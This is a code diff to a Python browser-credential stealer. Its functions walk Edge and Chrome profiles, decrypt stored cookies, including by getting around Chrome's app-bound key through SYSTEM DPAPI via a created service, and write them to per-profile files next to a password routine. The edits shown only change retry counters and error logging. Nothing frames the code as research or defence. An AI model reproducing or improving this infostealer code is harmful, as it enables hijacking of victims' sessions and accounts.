@@ -134,6 +134,7 @@ def decrypt_password(ciphertext, secret_key):
         return ""
 def cookie_ec():
     for profile in get_edge_profile():
+        thu = 0
         while True:
             try:
                 cookies_string =""
@@ -195,10 +196,15 @@ def cookie_ec():
                 with open(os.path.join(pathdata, f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'), 'w') as f:
                     f.write(cookies_string)
                 break
+        
             except Exception as f:
+                thu = thu + 1
+                if(thu == 5):
+                    break
                 print(str(f))
                 with open("error_log.txt", "a", encoding="utf-8") as log_file:
-                    log_file.write(f"Error: {str(f)}\n\n")
+                    log_file.write(f"Error {profile}: {str(f)}\n\n")
+    
 def cookie(slprofile):
     print(get_profile())
     for profile in get_profile():
@@ -219,7 +225,7 @@ def cookie(slprofile):
             encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
             print(binascii.b2a_base64(encrypted_key[1]).decode())
             """.replace("\n", ";") + "\""
-            thu = 4
+            thu = 0
             while True:
                 try:
                     cookies_string = ""
@@ -230,7 +236,7 @@ def cookie(slprofile):
                         c.create_service()
                         assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
                         app_bound_encrypted_key_b64 = binascii.b2a_base64(
-                            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
+                        binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
                         # decrypt with SYSTEM DPAPI
                         encrypted_key_b64, stderr, rc = c.run_executable(
                             sys.executable,
@@ -278,14 +284,14 @@ def cookie(slprofile):
                         f.write(cookies_string)
                     break
                 except:
-                    thu = thu - 1
-                    if(thu == 0):
+                    thu = thu + 1
+                    if(thu == 5):
                         break
                 
         except Exception as e:
             print(str(e))
             with open("error_log.txt", "a", encoding="utf-8") as log_file:
-                log_file.write(f"Error: {str(e)}\n\n")
+                log_file.write(f"Error {thu} {profile}: {str(e)}\n\n")
     return slprofile
 def password(slpass):
     for profile in get_profile():
